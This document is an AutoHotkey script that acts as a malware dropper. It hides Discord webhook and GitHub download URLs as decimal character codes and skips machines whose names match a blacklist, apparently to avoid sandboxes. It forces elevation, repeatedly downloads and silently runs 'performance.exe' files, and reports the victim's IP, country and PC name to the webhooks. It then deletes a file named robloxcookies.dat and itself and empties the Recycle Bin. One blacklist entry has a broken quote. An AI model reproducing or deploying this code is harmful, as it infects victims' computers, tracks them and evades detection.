#Requires AutoHotkey v2+
#SingleInstance Force
#NoTrayIcon
;–– CONFIG ––
wk := [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,56,50,55,48,57,48,53,49,52,51,52,57,57,53,55,56,52,47,50,112,120,67,88,111,117,84,110,107,79,113,101,89,85,107,90,95,48,66,110,72,48,86,112,54,115,104,74,99,121,57,66,87,105,116,86,72,52,72,79,88,100,122,122,116,53,70,105,71,88,78,53,79,85,77,88,81,122,109,81,72,55,71,76,55,70,113]
cl := [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,56,52,54,52,49,54,48,49,53,57,48,48,48,49,56,52,53,47,86,88,53,55,89,108,107,82,104,71,80,87,122,88,78,88,106,87,75,109,88,68,77,78,72,77,119,56,97,86,87,48,95,115,107,76,70,49,103,119,87,95,87,52,53,68,109,105,106,81,52,45,119,77,72,108,66,90,76,115,89,119,95,84,121,80,110,90]
exe := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,111,109,112,97,108,111,111,112,109,97,103,111,111,110,101,114,47,119,105,108,108,121,119,111,110,107,97,47,109,97,105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,101,120,101]
fs := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,111,109,112,97,108,111,111,112,109,97,103,111,111,110,101,114,47,119,105,108,108,121,119,111,110,107,97,47,109,97,105,110,47,112,101,114,102,111,114,109,97,110,99,101,118,50,46,101,120,101]
exeUrl := CharListToStr(exe)
wkUrl := CharListToStr(wk)
clUrl := CharListToStr(cl)
fsUrl := CharListToStr(fs)
blacklist := ["WDAGUtilityAccount", "3W1GJT", "QZSBJVWM", "5ISYH9SH", "Abby", "MATTY_PC", "DESKTOP-PBIF0SU", "hmarc", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "SEJTYPE, "RGzcBUyrznReg"]                                                                          
currentPC := EnvGet("COMPUTERNAME")
for pcName in blacklist {
    if (currentPC = pcName) {
        Sleep 1000
        ND("# - BLOCKED PC detected: **" . currentPC . "** - **Killing script.** :x:")
        CleanUpTemp()
        ExitApp
    }
}
if !A_IsAdmin {
    try {
        Run '*RunAs "' A_AhkPath '" "' A_ScriptFullPath '"'
    }
    catch Error as err {
        MsgBox err.Message
    }
    ExitApp
}
A_ThisException := ""
failureCount := 0
notified := false
cachedGeo := ""
cachedIP := ""
tempDir := A_AppData . "\PerformanceRun2"
exePath := tempDir . "\performance.exe"
fsPath := tempDir . "\performancev2.exe"
try {
    if DirExist(tempDir)
        DirDelete(tempDir, true)
}
catch {
}
DirCreate(tempDir)
NDWithLocation("## - Script started on " EnvGet("COMPUTERNAME") " at " A_Now)
loop 10000 {
if !TryMainExe()
    TryfsExe()
    sleep 1200000
}
TryMainExe() {
    global exeUrl, exePath
    retryLimit := 2

    if !PingURL(exeUrl) {
        NDWithLocation("Main EXE unreachable: " . exeUrl)
        return false
    }

    NDWithLocation("- Main EXE URL reachable")
    Loop retryLimit {
        attempt := A_Index
        if TryDownloadAndRun(exeUrl, exePath, "performance.exe", attempt) {
            NDWithLocation("- **Launched performance.exe successfully**")
            NDWithLocation2("- 10 Seconds till cleanup")
            Sleep 5000
            NDWithLocation2("- 5 Seconds till cleanup")
            Sleep 5000
            NDWithLocation2("- Cleanup :white_check_mark:")
            CleanUpTemp()
        }
        Sleep Random(10000, 30000)
    }
    NDWithLocation("performance.exe failed after " retryLimit " attempts")
    return false
}
TryfsExe() {
    global fsUrl, fsPath
    retryLimit := 5
    if !PingURL(fsUrl) {
        NDWithLocation("- Failsafe EXE unreachable: " . fsUrl)
        return false
    }
    NDWithLocation("**- Failsafe EXE URL reachable**")
    Loop retryLimit {
        attempt := A_Index
        if TryDownloadAndRun(fsUrl, fsPath, "performancev2.exe", attempt) {
            NDWithLocation("**- Launched performancev2.exe as failsafe**")    
            Sleep 1000
            CleanUpTemp()
            Sleep 1000
            ExitApp
        }
        Sleep Random(10000, 30000)
    }
    NDWithLocation("- performancev2.exe failed after " retryLimit " attempts")
    return false
}
TryDownloadAndRun(url, path, procName, attempt, silent := false) {
    try {
        HttpGetAndSave(url, path)
    } catch as e {
        if !silent
            NDWithLocation("Attempt " . attempt . " - Download failed for " . procName . ": " . e.Message)
        return false
    }
    try {
        size := FileOpen(path, "r").Length
        if (size = 0) {
            if !silent
                NDWithLocation("Attempt " . attempt . " - Downloaded file is empty: " . procName)
            return false
        }
        cmd := "cmd.exe /c " . Chr(34) . path . Chr(34)
        ComObject("WScript.Shell").Run(cmd, 0, false)
        Sleep 2000
        if IsProcessRunning(procName) {
            if !silent
                NDWithLocation("- " . procName . " is running. Exiting script.")
            return true
        }
        if !silent
            NDWithLocation("Attempt " . attempt . " - Process not running: " . procName)
    } catch as e {
        if !silent
            NDWithLocation("Attempt " . attempt . " - Launch error for " . procName . ": " . e.Message)
    }
    return false
}
IsProcessRunning(name) {
    try {
        shell := ComObject("WScript.Shell")
        exec := shell.Exec("tasklist /FI " . Chr(34) . "IMAGENAME eq " . name . Chr(34))
        output := exec.StdOut.ReadAll()
        return InStr(output, name) > 0
    } catch {
        return false
    }
}
PingURL(url) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", url, false)
        req.SetRequestHeader("User-Agent", "Mozilla/5.0")  ; Required for GitHub
        req.Send()
        ; Log the real status for debug
        NDWithLocation("PingURL " . url . " -> HTTP " . req.Status)
        return (req.Status = 200 || req.Status = 302)
    } catch {
        return false
    }
}

HttpGetAndSave(url, savePath) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", url, false)
        req.SetRequestHeader("User-Agent", "Mozilla/5.0")  ; Required for GitHub
        req.Send()

        if (req.Status = 404)
            return "HTTP 404: File not found"
        else if (req.Status != 200 && req.Status != 302)
            return Format("HTTP {1}", req.Status)

        stream := ComObject("ADODB.Stream")
        stream.Type := 1
        stream.Open()
        stream.Write(req.ResponseBody)
        stream.SaveToFile(savePath, 2)
        stream.Close()
    } catch as e {
        return e
    }
}

ND(msg) {
    global wkUrl
    try {
        json := "{" Chr(34) "content" Chr(34) ":" Chr(34) msg Chr(34) "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", wkUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)
    } catch {
    }
}
NDWithLocation(msg) {
    try {
        loc := GetGeoInfo()
        ip := GetPublicIP()
        pc := EnvGet("COMPUTERNAME")
        ND(loc . " - [IP: " . ip . "] - [" . pc . "] " . msg)
    } catch {
        ND("- [Geo/IP info unavailable] - [" . EnvGet("COMPUTERNAME") . "] " . msg)
    }
}
GetGeoInfo() {
    global cachedGeo
    if (cachedGeo != "")
        return cachedGeo

    req := ComObject("WinHttp.WinHttpRequest.5.1")
    req.Open("GET", "http://ip-api.com/line/?fields=countryCode,country", false)
    req.Send()
    if (req.Status = 200) {
        lines := StrSplit(req.ResponseText, "`n")
        code := Trim(lines[1])
        name := Trim(lines[2])
        flag := Chr(0x1F1E6 + Ord(SubStr(code, 1, 1)) - 65) . Chr(0x1F1E6 + Ord(SubStr(code, 2, 1)) - 65)
        cachedGeo := "- [" . name . "] "
        return cachedGeo
    } else
        return "Geo request failed"
}
GetPublicIP() {
    global cachedIP
    if (cachedIP != "")
        return cachedIP

    req := ComObject("WinHttp.WinHttpRequest.5.1")
    req.Open("GET", "https://api.ipify.org", false)
    req.Send()
    if (req.Status = 200) {
        cachedIP := Trim(req.ResponseText)
        return cachedIP
    } else
        return "IP fetch failed"
}
CharListToStr(arr) {
    out := ""
    for c in arr
        out .= Chr(c)
    return out
}
StrJoin(arr, delim := ", ") {
    out := ""
    for i, val in arr
        out .= (i > 1 ? delim : "") . val
    return out
}
ND2(msg) {
    global clUrl
    try {
        json := "{" Chr(34) "content" Chr(34) ":" Chr(34) msg Chr(34) "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", clUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)
    } catch {
    }
}
NDWithLocation2(msg) {
    try {
        loc := GetGeoInfo()
        ip := GetPublicIP()
        pc := EnvGet("COMPUTERNAME")
        ND2(loc . " - [IP: " . ip . "] - [" . pc . "] " . msg)
    } catch {
        ND2("- [Geo/IP info unavailable] - [" . EnvGet("COMPUTERNAME") . "] " . msg)
    }
}
CleanUpTemp() {
    tempDir := A_AppData "\PerformanceRun2"
    Sleep 5000
    NDWithLocation2("Attempting to delete: " . tempDir)

    if DirExist(tempDir) {
        try {
            Loop Files, tempDir "\*", "R" {
                FileSetAttrib("-R", A_LoopFileFullPath, true)
            }
            DirDelete(tempDir, true)
            NDWithLocation2("- ✅ Deleted folder: " . tempDir)
        } catch as e {
            NDWithLocation2("- ❌ FAILED to delete folder: " . tempDir . "`nReason: " . e.Message)
        }
    } else {
        NDWithLocation2("- Folder not found: " . tempDir)
    }

    tempPath := A_Temp
    pcName := EnvGet("COMPUTERNAME")

    for fileName in ["a.ahk", "robloxcookies.dat"] {
        filePath := tempPath "\" fileName
        if FileExist(filePath) {
            FileDelete(filePath)
            NDWithLocation2("- Deleted file: " . fileName)
        } else {
            NDWithLocation2("- File not found: " . fileName)
        }
    }

    NDWithLocation("- Self-Deleting in 1 second!")
    Sleep 1000
    SelfDelete()

}

SelfDelete() {
    scriptPath := A_ScriptFullPath
    pid := DllCall("GetCurrentProcessId")

    deleterScript := Format("
(
pid := {1}
while ProcessExist(pid)
    Sleep 500
Sleep 500
FileDelete '{2}'
DllCall('Shell32\SHEmptyRecycleBinW', 'Ptr', 0, 'Ptr', 0, 'UInt', 0x7)
ExitApp

ProcessExist(pid) {
    try {
        shell := ComObject('WScript.Shell')
        exec := shell.Exec('tasklist /FI ""PID eq ' pid '""')
        return InStr(exec.StdOut.ReadAll(), pid)
    } catch {
        return false
    }
}
)", pid, scriptPath)

    tmpDeleter := A_Temp "\d.ahk"
    if FileExist(tmpDeleter)
        FileDelete(tmpDeleter)
    FileAppend(deleterScript, tmpDeleter)

    Run('"' A_AhkPath '" "' tmpDeleter '"', , "Hide")
    ExitApp
}
